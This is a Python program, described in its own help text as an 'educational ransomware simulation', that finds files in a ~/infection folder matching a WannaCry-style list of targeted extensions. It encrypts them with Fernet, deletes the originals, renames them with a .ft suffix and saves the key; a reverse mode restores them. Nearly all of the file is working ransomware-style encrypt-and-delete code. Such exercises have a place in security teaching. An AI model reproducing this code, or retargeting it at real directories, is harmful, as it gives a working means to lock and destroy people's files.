import os
import sys
import argparse
from cryptography.fernet import Fernet, InvalidToken

VERSION = "1.0.0"

WANNACRY_EXTENSIONS = {
    ".doc", ".docx", ".xls", ".xlsx", ".ppt", ".pptx", ".pst", ".ost",
    ".msg", ".eml", ".vsd", ".vsdx", ".txt", ".csv", ".rtf", ".123",
    ".wks", ".wk1", ".pdf", ".dwg", ".onetoc2", ".snt", ".jpeg", ".jpg",
    ".docb", ".docm", ".dot", ".dotm", ".dotx", ".xlsm", ".xlsb", ".xlw",
    ".xlt", ".xlm", ".xlc", ".xltx", ".xltm", ".pptm", ".pot", ".pps",
    ".ppsm", ".ppsx", ".ppam", ".potx", ".potm", ".edb", ".hwp", ".602",
    ".sxi", ".sti", ".sldx", ".sldm", ".vdi", ".vmdk", ".vmx", ".gpg",
    ".aes", ".arc", ".asc", ".bak", ".backup", ".bmp", ".cgm", ".class",
    ".cmd", ".cpp", ".crt", ".csr", ".dat", ".dbf", ".dch", ".der",
    ".dif", ".dip", ".djvu", ".fla", ".gif", ".gz", ".ibd", ".idx",
    ".iso", ".jar", ".java", ".js", ".key", ".lay", ".lay6", ".ldf",
    ".m3u", ".mkv", ".mml", ".mp3", ".mp4", ".mpa", ".mpg",
    ".myd", ".myi", ".nef", ".odb", ".odg", ".odp", ".ods", ".odt",
    ".ogg", ".otg", ".otp", ".ots", ".ott", ".p12", ".pas",
    ".pem", ".pfx", ".php", ".png", ".pot", ".psd", ".raw", ".rb",
    ".sln", ".slk", ".sql", ".sqlite3", ".sqlitedb", ".stc", ".std",
    ".stw", ".suo", ".svg", ".swf", ".sxc", ".sxd", ".sxm",
    ".sxw", ".tar", ".tbk", ".tgz", ".tif", ".tiff", ".uop", ".uot",
    ".vb", ".vbs", ".vcd", ".vob", ".wab", ".wad", ".war", ".wma",
    ".wmv", ".wps", ".zip", ".json"
}

INFECTION_DIR = os.path.join(os.path.expanduser("~"), "infection")
FT_EXTENSION = ".ft"
SCRIPT_DIR = os.path.dirname(os.path.abspath(__file__))
KEY_FILE = os.path.join(SCRIPT_DIR, "stockholm.key")


def get_files(directory):
    """Get all files matching WannaCry extensions, skipping already encrypted .ft files."""
    targets = []
    try:
        for root, _, files in os.walk(directory):
            for filename in files:
                if filename.endswith(FT_EXTENSION):
                    continue
                _, ext = os.path.splitext(filename)
                if ext.lower() in WANNACRY_EXTENSIONS:
                    targets.append(os.path.join(root, filename))
    except Exception as e:
        print(f"Error walking directory: {e}", file=sys.stderr)
    return targets


def get_encrypted_files(directory):
    """Get all .ft files in directory."""
    targets = []
    try:
        for root, _, files in os.walk(directory):
            for filename in files:
                if filename.endswith(FT_EXTENSION):
                    targets.append(os.path.join(root, filename))
    except Exception as e:
        print(f"Error walking directory: {e}", file=sys.stderr)
    return targets


def encrypt_file(filepath, fernet, silent):
    """Encrypt a single file and rename it with .ft extension."""
    try:
        with open(filepath, "rb") as f:
            data = f.read()

        encrypted = fernet.encrypt(data)

        new_path = filepath + FT_EXTENSION
        with open(new_path, "wb") as f:
            f.write(encrypted)

        os.remove(filepath)

        if not silent:
            print(f"Encrypted: {os.path.basename(filepath)} -> {os.path.basename(new_path)}")

    except Exception as e:
        print(f"Error encrypting {filepath}: {e}", file=sys.stderr)


def decrypt_file(filepath, fernet, silent):
    """Decrypt a single .ft file and restore its original name."""
    try:
        with open(filepath, "rb") as f:
            data = f.read()

        decrypted = fernet.decrypt(data)

        original_path = filepath[:-len(FT_EXTENSION)]
        with open(original_path, "wb") as f:
            f.write(decrypted)

        os.remove(filepath)

        if not silent:
            print(f"Decrypted: {os.path.basename(filepath)} -> {os.path.basename(original_path)}")

    except InvalidToken:
        print(f"Error decrypting {filepath}: invalid key.", file=sys.stderr)
    except Exception as e:
        print(f"Error decrypting {filepath}: {e}", file=sys.stderr)


def encrypt(silent):
    """Encrypt all eligible files in ~/infection."""
    if not os.path.isdir(INFECTION_DIR):
        print(f"Error: directory '{INFECTION_DIR}' not found.", file=sys.stderr)
        sys.exit(1)

    files = get_files(INFECTION_DIR)
    if not files:
        print("No eligible files found.", file=sys.stderr)
        return

    key = Fernet.generate_key()
    fernet = Fernet(key)

    for filepath in files:
        encrypt_file(filepath, fernet, silent)

    # Save key to file
    try:
        with open(KEY_FILE, "w") as kf:
            kf.write(key.decode())
        if not silent:
            print(f"\n✓ Encryption key saved to: {KEY_FILE}")
            print(f"✓ Encryption key: {key.decode()}")
    except Exception as e:
        print(f"Error saving key file: {e}", file=sys.stderr)


def decrypt(key_str, silent):
    """Decrypt all .ft files in ~/infection using the provided key."""
    if not os.path.isdir(INFECTION_DIR):
        print(f"Error: directory '{INFECTION_DIR}' not found.", file=sys.stderr)
        sys.exit(1)

    # Try to read key from file if it's a file path
    key_to_use = key_str
    if os.path.isfile(key_str):
        try:
            with open(key_str, "r") as kf:
                key_to_use = kf.read().strip()
            if not silent:
                print(f"✓ Key loaded from: {key_str}")
        except Exception as e:
            print(f"Error reading key file: {e}", file=sys.stderr)
            sys.exit(1)

    if len(key_to_use) < 16:
        print("Error: key must be at least 16 characters.", file=sys.stderr)
        sys.exit(1)

    try:
        fernet = Fernet(key_to_use.encode())
    except Exception:
        print("Error: invalid Fernet key format.", file=sys.stderr)
        sys.exit(1)

    files = get_encrypted_files(INFECTION_DIR)
    if not files:
        print("No encrypted files found.", file=sys.stderr)
        return

    for filepath in files:
        decrypt_file(filepath, fernet, silent)


def main():
    parser = argparse.ArgumentParser(
        prog="stockholm",
        description="Educational ransomware simulation. For educational purposes only.",
        add_help=False
    )
    parser.add_argument("-h", "--help", action="store_true", help="Show this help message")
    parser.add_argument("-v", "--version", action="store_true", help="Show program version")
    parser.add_argument("-s", "--silent", action="store_true", help="Run without output")
    parser.add_argument("-r", "--reverse", metavar="KEY", help="Decrypt files using KEY")

    args = parser.parse_args()

    if args.help:
        parser.print_help()
        sys.exit(0)

    if args.version:
        print(f"stockholm version {VERSION}")
        sys.exit(0)

    if args.reverse:
        decrypt(args.reverse, args.silent)
    else:
        encrypt(args.silent)


if __name__ == "__main__":
    main()